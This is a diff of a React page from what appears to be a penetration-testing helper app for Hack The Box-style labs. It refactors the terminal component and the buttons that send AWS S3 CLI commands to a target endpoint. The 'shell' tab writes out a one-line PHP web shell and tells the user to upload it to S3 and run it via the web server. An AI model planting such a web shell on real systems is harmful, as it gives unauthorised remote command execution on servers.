@@ -1,38 +1,20 @@
-import { useRef, useState } from 'react';
+import { useState } from 'react';
 import { useJobs } from '../context/JobContext';
 import { useSocket } from '../context/SocketContext';
-import { useTerminal } from '../hooks/useTerminal';
 import { InfoCard, CmdLine, SectionTitle } from '../components/InfoCard';
 import { sendCmd } from '../utils/helpers';
-
-const termId = 'aws-main';
-
-function AwsTerm() {
-  const containerRef = useRef(null);
-  const { isReady } = useTerminal(termId, containerRef);
-  return (
-    <div className="terminal-container" style={{ height: 240 }}>
-      <div className="terminal-titlebar">
-        <div className="terminal-dots">
-          <div className="terminal-dot red" /><div className="terminal-dot yellow" /><div className="terminal-dot green" />
-        </div>
-        <div className="terminal-title">
-          {isReady ? <span style={{ color: 'var(--accent-green)' }}>● aws cli</span> : <span style={{ color: 'var(--text-muted)' }}>○ bağlanıyor...</span>}
-        </div>
-      </div>
-      <div ref={containerRef} style={{ height: 202, padding: '4px 2px' }} />
-    </div>
-  );
-}
+import Terminal from '../components/Terminal';
 
 export default function AwsPage({ onBack }) {
-  const { activeJob } = useJobs();
+  const { activeJob, activeJobId } = useJobs();
   const { socket } = useSocket();
   const [endpoint, setEndpoint] = useState('http://s3.target.htb');
   const [tab, setTab] = useState('s3');
 
+  const termId = `aws-${activeJobId || 'default'}`;
+
   return (
-    <div>
+    <div style={{ paddingBottom: 40 }}>
       <div className="page-header">
         <div>
           <div className="page-header-back" onClick={onBack}>← Ana Menü</div>
@@ -53,21 +35,21 @@ export default function AwsPage({ onBack }) {
         <>
           <div className="ip-bar" style={{ marginBottom: 12 }}>
             <span className="ip-bar-label">🌐 Endpoint</span>
-            <input value={endpoint} onChange={e => setEndpoint(e.target.value)} placeholder="http://s3.target.htb" />
+            <input className="form-input" value={endpoint} onChange={e => setEndpoint(e.target.value)} placeholder="http://s3.target.htb" style={{ height: 38 }} />
           </div>
           <div style={{ display: 'flex', gap: 10, marginBottom: 12, flexWrap: 'wrap' }}>
-            <button className="btn btn-green" onClick={() => sendCmd(socket, termId, `aws --endpoint-url ${endpoint} s3 ls`)}>
+            <button className="btn-pro btn-green" onClick={() => sendCmd(socket, termId, `aws --endpoint-url ${endpoint} s3 ls`)}>
               📋 Bucket Listele
             </button>
-            <button className="btn btn-cyan" onClick={() => sendCmd(socket, termId, `aws --endpoint-url ${endpoint} s3 ls s3://<bucket>`)}>
+            <button className="btn-pro btn-cyan" onClick={() => sendCmd(socket, termId, `aws --endpoint-url ${endpoint} s3 ls s3://<bucket>`)}>
               📂 Bucket İçeriği
             </button>
-            <button className="btn btn-purple" onClick={() => sendCmd(socket, termId, `aws --endpoint-url ${endpoint} s3 cp s3://<bucket>/<dosya> .`)}>
+            <button className="btn-pro btn-purple" onClick={() => sendCmd(socket, termId, `aws --endpoint-url ${endpoint} s3 cp s3://<bucket>/<dosya> .`)}>
               ⬇ Dosya İndir
             </button>
           </div>
 
-          <AwsTerm />
+          <Terminal id={termId} title="AWS Terminal" height={240} />
 
           <SectionTitle icon="📋">S3 Komutları</SectionTitle>
           <InfoCard title="Temel S3 İşlemleri" icon="🪣" defaultOpen color="green">
@@ -91,7 +73,7 @@ export default function AwsPage({ onBack }) {
 
       {tab === 'configure' && (
         <>
-          <AwsTerm />
+          <Terminal id={termId} title="AWS Terminal" height={240} />
           <SectionTitle icon="⚙">Yapılandırma</SectionTitle>
           <InfoCard title="aws configure – Hızlı Dummy Ayar" icon="⚙" defaultOpen color="cyan">
             <CmdLine cmd="aws configure" desc="Etkileşimli kurulum – aşağıdaki değerleri gir" termId={termId} />
@@ -117,7 +99,7 @@ EOF`} desc="Geçici credential dosyası oluştur" termId={termId} />
 
       {tab === 'shell' && (
         <>
-          <AwsTerm />
+          <Terminal id={termId} title="AWS Terminal" height={240} />
           <InfoCard title="S3 Üzerinden Shell" icon="🐚" defaultOpen color="orange">
             <div className="cmd-desc">PHP shell'i S3'e yükle, web sunucusu üzerinden çalıştır:</div>
             <CmdLine cmd={`echo '<?php system($_GET["cmd"]); ?>' > shell.php`} desc="Shell oluştur" termId={termId} />
